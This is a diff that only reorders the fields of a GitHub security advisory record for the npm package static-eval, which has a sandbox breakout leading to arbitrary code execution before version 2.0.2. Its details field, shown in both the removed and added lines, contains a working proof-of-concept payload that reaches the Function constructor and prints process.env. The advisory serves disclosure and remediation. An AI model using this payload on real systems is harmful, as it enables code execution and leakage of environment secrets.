@@ -1,18 +1,43 @@
 {
-  "id": "GHSA-x9hc-rw35-f44h",
-  "summary": "Sandbox Breakout / Arbitrary Code Execution in static-eval",
-  "details": "Versions of `static-eval`prior to 2.0.2 pass untrusted user input directly to the global function constructor, resulting in an arbitrary code execution vulnerability when user input is parsed via the package.\n\n## Proof of concept\n```\nvar evaluate = require('static-eval');\nvar parse = require('esprima').parse;\n\nvar src = process.argv[2];\nvar payload = '(function({x}){return x.constructor})({x:\"\".sub})(\"console.log(process.env)\")()'\nvar ast = parse(payload).body[0].expression;\nconsole.log(evaluate(ast, {x:1}));\n```\n\n\n## Recommendation\n\nUpgrade to version 2.0.2 or later.",
-  "modified": "2021-09-27T13:40:52Z",
-  "published": "2020-09-02T15:46:03Z",
+  "affected": [
+    {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 2.0.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-x9hc-rw35-f44h/GHSA-x9hc-rw35-f44h.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "static-eval",
+        "purl": "pkg:npm/static-eval"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "database_specific": {
-    "nvd_published_at": null,
     "cwe_ids": [
       "CWE-94"
     ],
-    "severity": "HIGH",
     "github_reviewed": true,
-    "github_reviewed_at": "2020-08-31T18:34:42Z"
+    "github_reviewed_at": "2020-08-31T18:34:42Z",
+    "nvd_published_at": null,
+    "severity": "HIGH"
   },
+  "details": "Versions of `static-eval`prior to 2.0.2 pass untrusted user input directly to the global function constructor, resulting in an arbitrary code execution vulnerability when user input is parsed via the package.\n\n## Proof of concept\n```\nvar evaluate = require('static-eval');\nvar parse = require('esprima').parse;\n\nvar src = process.argv[2];\nvar payload = '(function({x}){return x.constructor})({x:\"\".sub})(\"console.log(process.env)\")()'\nvar ast = parse(payload).body[0].expression;\nconsole.log(evaluate(ast, {x:1}));\n```\n\n\n## Recommendation\n\nUpgrade to version 2.0.2 or later.",
+  "id": "GHSA-x9hc-rw35-f44h",
+  "modified": "2021-09-27T13:40:52Z",
+  "published": "2020-09-02T15:46:03Z",
   "references": [
     {
       "type": "PACKAGE",
@@ -23,37 +48,12 @@
       "url": "https://www.npmjs.com/advisories/758"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "static-eval",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/static-eval"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "2.0.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "last_known_affected_version_range": "<= 2.0.1",
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-x9hc-rw35-f44h/GHSA-x9hc-rw35-f44h.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Sandbox Breakout / Arbitrary Code Execution in static-eval"
 }
